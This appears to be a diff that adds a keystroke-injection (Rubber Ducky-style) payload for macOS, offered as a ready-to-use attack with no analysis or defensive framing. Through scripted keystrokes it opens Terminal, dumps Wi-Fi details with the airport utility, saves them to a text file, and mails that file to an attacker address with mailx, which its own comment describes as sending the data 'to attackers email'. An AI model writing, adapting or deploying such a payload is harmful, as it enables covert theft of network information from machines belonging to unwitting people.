@@ -1,0 +1,49 @@
+-------------------------------------------------------------------------------------
+REM Clears terminal, gets wifi info, copies to txt file and sends to attackers email.
+-------------------------------------------------------------------------------------
+DELAY 5000
+GUI SPACE
+DELAY 1500
+STRING terminal
+DELAY 1500
+ENTER
+DELAY 10000
+STRING clear
+DELAY 1500
+ENTER
+DELAY 1500
+STRING /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport --getinfo
+DELAY 2000
+ENTER
+DELAY 1500
+GUI a
+DELAY 1000
+GUI c
+REM DELAY 1000
+REM STRING cd /Users/*/Desktop
+DELAY 1500
+STRING touch 1337.txt
+DELAY 1500 
+ENTER
+DELAY 2000
+STRING nano 1337.txt
+DELAY 2000
+ENTER
+DELAY 2000
+GUI v
+DELAY 2000
+CTRL x
+DELAY 2000
+STRING y
+DELAY 2000
+ENTER
+DELAY 1500
+STRING cd ~/Desktop
+DELAY 1500
+ENTER
+DELAY 1500
+STRING cat 1337.txt | mailx -v -s "1337" attackerEmail@email.com
+DELAY 2000
+ENTER
+DELAY 2000
+GUI q
